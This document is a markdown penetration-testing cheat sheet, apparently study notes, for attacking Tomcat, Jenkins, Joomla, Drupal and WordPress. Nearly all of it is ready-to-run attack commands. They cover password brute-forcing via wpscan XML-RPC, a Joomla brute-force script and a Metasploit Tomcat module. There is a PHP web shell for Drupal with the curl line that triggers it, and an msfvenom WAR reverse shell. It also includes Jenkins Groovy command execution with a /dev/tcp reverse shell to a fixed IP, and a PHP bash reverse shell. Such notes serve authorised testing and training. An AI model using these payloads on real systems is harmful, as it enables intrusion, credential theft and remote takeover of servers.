#web #tomcat #jenkins #joomla #drupal #splunk

# Attacking Common Applications

Tomcat, Jenkins, Joomla, Drupal, WordPress, Splunk. Related: [wordpress](wordpress.md) · [fuzzing](fuzzing.md) · [metasploit](../Tools/metasploit.md) · [shells-payloads](../Tools/shells-payloads.md)

## Discovery
```bash
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
Scan common web ports across a scope list.

```bash
eyewitness --web -x web_discovery.xml -d screenshots
```
Screenshot discovered web apps from Nmap XML.

```bash
cat web_discovery.xml | ./aquatone -nmap
```
Screenshot/triage web apps with aquatone.

```bash
gobuster dir -u http://<site> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
Directory brute-force. See [fuzzing](fuzzing.md).

## WordPress
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://<site>
```
Password attack via XML-RPC. See [wordpress](wordpress.md).

## Joomla
```bash
droopescan scan joomla --url http://<site>
```
Enumerate a Joomla site.

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
Brute-force Joomla admin login.

## Drupal
```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```
PHP web shell to plant on a vulnerable Drupal node.

```bash
curl -s "http://<site>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id" | grep uid
```
Trigger the planted web shell.

## Tomcat
```bash
nmap -sV -p 8009,8080 <site>
```
Enumerate Tomcat HTTP + AJP.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > backup.war
```
Build a WAR reverse shell to deploy via the manager. See [shells-payloads](../Tools/shells-payloads.md).

```
auxiliary/scanner/http/tomcat_mgr_login
```
Metasploit module to brute-force the Tomcat manager.

## Jenkins (Script Console — Groovy)
```groovy
def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
```
Run commands on Windows via the Jenkins Script Console.

```groovy
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```
Groovy reverse shell (Linux target).

## Web Shell Access
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>
```
Linux PHP reverse shell. See [shells-payloads](../Tools/shells-payloads.md).
